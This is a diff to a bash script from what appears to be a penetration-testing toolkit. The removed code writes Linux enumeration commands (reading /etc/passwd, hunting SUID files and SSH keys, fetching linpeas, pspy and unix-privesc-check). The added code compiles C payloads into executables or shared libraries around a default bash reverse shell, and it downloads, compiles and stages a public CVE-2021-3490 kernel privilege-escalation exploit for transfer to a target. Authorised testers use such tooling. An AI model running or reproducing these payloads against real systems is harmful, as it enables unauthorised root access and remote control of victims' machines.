@@ -31,65 +31,67 @@ linux_esclation_strategy() {
     echo 'searchsploit linux kernel $(uname -r)'
 }
 
-linux_enumeration_auto() {
-    echo 'Linux Manual Enumeration'
-    echo "wget http://$http_ip:$http_port/linux_auto.sh"
-    echo '#!/bin/bash' > linux_auto.sh
-    echo 'id' >> linux_auto.sh
-    echo 'cat /etc/passwd' >> linux_auto.sh
-    echo 'hostname' >> linux_auto.sh
-    echo 'cat /etc/issue' >> linux_auto.sh
-    echo 'uname -a' >> linux_auto.sh
-    echo 'ps aux' >> linux_auto.sh
-    echo 'ip a' >> linux_auto.sh
-    echo 'routel' >> linux_auto.sh
-    echo 'ss -anp' >> linux_auto.sh
-    echo 'cat /etc/iptables/rules.v4' >> linux_auto.sh
-    echo 'ls -lah /etc/cron*' >> linux_auto.sh
-    echo 'crontab -l' >> linux_auto.sh
-    echo 'sudo crontab -l' >>  linux_auto.sh
-    echo 'dpkg -l' >> linux_auto.sh
-    echo 'find / -writable -type d 2>/dev/null' >> linux_auto.sh
-    echo 'cat /etc/fstab' >> linux_auto.sh
-    echo 'mount' >> linux_auto.sh
-    echo 'lsblk' >> linux_auto.sh
-    echo 'lsmod' >> linux_auto.sh
-    echo '/sbin/modinfo libata' >> linux_auto.sh
-    echo 'find / -perm -u=s -type f 2>/dev/null' >> linux_auto.sh
-    echo 'Linux Automatic Enumeration' 
-    echo 'echo "Look at user trails"' >> linux_auto.sh
-    echo 'env' >> linux_auto.sh
-    echo 'cat ~/.bashrc' >> linux_auto.sh
-    echo 'Linux Automatic Enumeration'
-    echo "wget http://$http_ip:$http_port/unix_privesc_check.sh" >> linux_auto.sh
-    echo unix_privesc_check standard >> linux_auto.sh
-}
-
-
-download_linpeas() {
-    if [ ! -f "linpeas.sh" ]; then
-        linpeas_link=$(curl -s https://github.com/peass-ng/PEASS-ng/releases | grep linpeas.sh | grep -oP 'href="\K[^"]+')
-        wget https://github.com$linpeas_link
+create_linux_exploits_generic() {
+    if [[ -z "$exploit_dir" ]]; then
+        exploit_dir="exploit"
     fi
-    echo "wget http://$http_ip:$http_port/linpeas.sh -O linpeas.sh"
+    if [[ -z $linux_c_file_name ]]; then
+        echo "linux_c_file_name is not set"
+        return 1
+    fi
+    if [[ -z $compile_command ]]; then
+        echo "compile_command is not set"
+        return 1
+    fi
+    if [[ ! -d $exploit_dir ]]; then
+        mkdir "$exploit_dir"
+    fi
+    pushd "$exploit_dir" || exit 1
+    cp "$SCRIPTDIR/../c/$linux_c_file_name" .
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+        echo "cmd is not set, using default: $cmd"
+    fi
+    local command=$(echo "$cmd" | sed 's/"/\\"/g')
+    command=$(escape_sed "$command")
+    sed -E -i 's/\{command\}/'"$command"'/g' $linux_c_file_name
+    echo "all:" > Makefile
+    echo -e "\t$compile_command" >> Makefile
+    #most production systems do not come with make
+    echo "$compile_command" > make.sh
+    chmod a+x make.sh   
+    if [[ ! -z $compile_exploit ]] && [[ $compile_exploit == "true" ]]; then
+        compile_cpp
+    fi
+    popd || exit 1
+    local exploit_filename=$(get_compression_filename "$exploit_dir")
+    if [[ -f $exploit_filename ]]; then
+        rm "$exploit_filename"
+    fi
+    compress_file "$exploit_filename" "$exploit_dir"
+    generate_download_linux "$exploit_filename"
+    get_uncompress_command "$exploit_filename"
+    echo "cd $exploit_dir"
+    echo "make"    
 }
 
-get_unix_privesc_check() {
-    cp /usr/share/unix-privesc-check/unix-privesc-check .
-    generate_linux_download unix-privesc-check
+
+create_linux_executable() {
+    echo "Creating Linux executable..."
+    exploit_dir="exploit_executable"
+    linux_c_file_name="run_linux.c"
+    compile_command="gcc -o run_linux $linux_c_file_name"
+    create_linux_exploits_generic
 }
 
-check_ssh_keys() {
-    echo 'find / -regex ".*\.ssh.*" 2>/dev/null'
+create_linux_shared_library() {
+    echo "Creating Linux shared library..."
+    exploit_dir="exploit_shared"
+    linux_c_file_name="run_linux_so.c"
+    compile_command="gcc -shared -fPIC -o librun_linux.so $linux_c_file_name"
+    create_linux_exploits_generic
 }
 
-check_text_files() {
-    echo 'find / -type f -name "*.txt" 2>/dev/null'
-}
-
-find_folders_with_write_permissions() {
-    echo 'find . -type d -perm -002 -print 2>/dev/null'
-}
 
 compile_cpp() {
     if [[ -z "$target_os" ]]; then
@@ -102,7 +104,7 @@ compile_cpp() {
     if [[ ! -z "$extra_packages" ]]; then
         echo "Adding extra packages to the apt installation, $extra_packages"
     fi
-    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "apt update && DEBIAN_FRONTEND=noninteractive apt install -y gcc gcc-multilib binutils make $extra_packages && $make_command"
+    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "apt update && DEBIAN_FRONTEND=noninteractive apt install -y gcc binutils make $extra_packages && $make_command"
 
 }
 
@@ -309,6 +311,7 @@ perform_cve_2021_22555() {
             echo "Compiling exploit..."
             echo "all:" > Makefile
             echo -e "\tgcc -m32 -static -o exploit -Wall exploit.c" >> Makefile
+            extra_packages="gcc-multilib"
             compile_cpp
         else
             echo "Exploit already compiled, skipping compilation."
@@ -449,12 +452,33 @@ perform_cve_2022_0847() {
 }
 
 
-get_pspy() {
-    local url='https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64'
-    if [[ -f "pspy64" ]]; then
-        echo "pspy64 already exists, skipping download."
-    else
-        wget "$url" -O pspy64
+# 20.04 make_command="make groovy"
+# 21.04 make_command="make hirsute"
+#
+perform_cve_2021_3490() {
+    local download_url="https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main"
+    local download_filename="cve_2021_3490.zip"
+    local cve_dir="Linux_LPE_eBPF_CVE-2021-3490-main"
+    if [[ ! -f "$download_filename" ]]; then
+        wget "$download_url" -O "$download_filename"
     fi
-    generate_linux_download "pspy64"
+    unzip -n "$download_filename"
+    pushd "$cve_dir" || exit 1
+    if [[ ! -z "$compile_exploit" ]]; then
+        if [[ ! -f "exploit" ]]; then
+            echo "Compiling exploit..."
+            compile_cpp
+        else
+            echo "Exploit already compiled, skipping compilation."
+        fi
+    fi
+    popd || exit 1
+    local cve_filename=$(get_compression_filename "cve_2021_3490")
+    rm $cve_filename
+    compress_file "$cve_filename" "$cve_dir"
+    generate_linux_download "$cve_filename"
+    get_uncompress_command "$cve_filename"
+    echo "cd $cve_dir"
+    echo "make"
+    echo "./exploit"
 }
